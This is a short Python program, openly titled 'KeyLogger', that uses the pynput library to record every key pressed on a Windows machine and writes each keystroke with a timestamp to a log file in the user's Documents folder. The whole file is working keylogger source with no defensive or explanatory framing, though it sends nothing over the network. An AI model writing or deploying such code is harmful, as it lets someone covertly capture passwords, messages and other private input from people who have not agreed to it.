'''
Author: Anshu Saini
GitHub: https://github.com/anshu189
Mail: anshusaini189381@gmail.com
Requirements: pynput, os, logging (pip install pynput)
Program: KeyLogger

'''

from pynput.keyboard import Listener
import os
import logging

user = os.getlogin()
log_dir = f"C:/Users/{user}/Documents"

logging.basicConfig(filename=f"{log_dir}/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")


def key_handler(key):
    logging.info(key)


with Listener(on_press=key_handler) as listner:
    listner.join()
